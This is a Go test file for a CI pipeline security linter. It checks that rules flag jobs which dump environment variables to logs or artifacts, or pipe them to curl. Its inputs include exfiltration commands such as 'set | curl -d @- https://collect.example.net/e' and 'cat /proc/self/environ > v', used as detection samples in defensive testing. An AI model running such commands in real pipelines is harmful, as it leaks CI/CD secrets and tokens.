// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"fmt"
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
)

func TestEnvDumpReview_LegacyQuotesAndComments(t *testing.T) {
	for _, tc := range []struct {
		rule, script string
	}{
		{"GL062", `bash -c "cd /tmp; env; make"`},
		{"GL062", `sh -c 'cd /tmp; env; make'`},
		{"GL014", `bash -c "cd /tmp && env > v"`},
		{"GL014", "# don't\nenv > v"},
		{"GL062", `bash -c "cd /tmp; printenv; make"`},
		{"GL014", "# don't\nprintenv > v"},
		{"GL014", "# don't\nexport -p > v"},
		{"GL014", "# don't\ncat /proc/self/environ > v"},
	} {
		t.Run(tc.rule+"/"+tc.script, func(t *testing.T) {
			src := "job:\n  script: |\n    " + strings.ReplaceAll(tc.script, "\n", "\n    ") + "\n  artifacts:\n    paths: [v]\n"
			var f []finding.Finding
			if tc.rule == "GL062" {
				f = findings062(t, src)
			} else {
				f = findings014(t, src)
			}
			if len(f) != 1 || f[0].RuleID != tc.rule || f[0].Severity != finding.Warn || f[0].Job != "job" {
				t.Fatalf("legacy dump must remain reported: %+v", f)
			}
		})
	}
}

func TestEnvDumpReview_CaseBoundaries(t *testing.T) {
	for _, tc := range []struct {
		script string
		want   bool
	}{
		{"set) do_set ;;", false},
		{"export) do_export ;;", false},
		{"declare) do_declare ;;", false},
		{"case \"$action\" in\nset) do_set ;;\nexport) do_export ;;\nesac", false},
		{"( set )", true},
		{"( export )", true},
		{"(echo start; set)", true},
		{"(echo start); set) do_set ;;", false},
	} {
		t.Run(tc.script, func(t *testing.T) {
			f := findings062(t, fmt.Sprintf("job:\n  script: [%q]\n", tc.script))
			if (len(f) == 1) != tc.want || len(f) > 1 {
				t.Fatalf("got %+v, want finding=%v", f, tc.want)
			}
		})
	}
}

func TestEnvDumpReview_Messages(t *testing.T) {
	const legacy = "printenv/env with no arguments dumps every environment variable to the job log, including CI/CD secrets and tokens that may not be reliably masked — print only the specific variables you need"
	for _, command := range []string{"env", "printenv", "/usr/bin/env", "/bin/printenv", `bash -c "cd /tmp; env; make"`} {
		t.Run(command, func(t *testing.T) {
			f := findings062(t, fmt.Sprintf("job:\n  script: [%q]\n", command))
			if len(f) != 1 || f[0].Message != legacy {
				t.Fatalf("legacy message changed: %+v", f)
			}
		})
	}
	for _, command := range []string{"set", "export -p", "declare -p", "env -0", "gci env:"} {
		t.Run(command, func(t *testing.T) {
			f := findings062(t, fmt.Sprintf("job:\n  script: [%q]\n", command))
			if len(f) != 1 || !strings.HasPrefix(f[0].Message, command+" dumps every environment variable") {
				t.Fatalf("new dump message must name its command: %+v", f)
			}
		})
	}
	const filtered = `env/printenv filtered with grep "^CI" prints every variable that matches, including CI/CD secrets such as CI_JOB_TOKEN or CI_REGISTRY_PASSWORD whose names match — print only the specific variables you need`
	f := findings062(t, "job:\n  script: ['env | grep ^CI']\n")
	if len(f) != 1 || f[0].Message != filtered {
		t.Fatalf("legacy filtered message changed: %+v", f)
	}
}

func TestGL083_NewEnvironmentDump(t *testing.T) {
	for _, command := range []string{"set", "export -p", "declare -p", "gci env:"} {
		t.Run(command, func(t *testing.T) {
			f := findings083(t, fmt.Sprintf("job:\n  script: [%q]\n", command+" | curl -d @- https://collect.example.net/e"))
			if len(f) != 1 || f[0].RuleID != "GL083" || f[0].Severity != finding.Error || !strings.Contains(f[0].Message, "environment piped to a network tool") {
				t.Fatalf("expected environment exfiltration error: %+v", f)
			}
		})
	}
	for _, command := range []string{"set -e", "export FOO=bar", "Get-ChildItem env:PATH"} {
		t.Run(command, func(t *testing.T) {
			f := findings083(t, fmt.Sprintf("job:\n  script: [%q]\n", command+" | curl -d @- https://collect.example.net/e"))
			if len(f) != 0 {
				t.Fatalf("expected no full-environment exfiltration: %+v", f)
			}
		})
	}
}
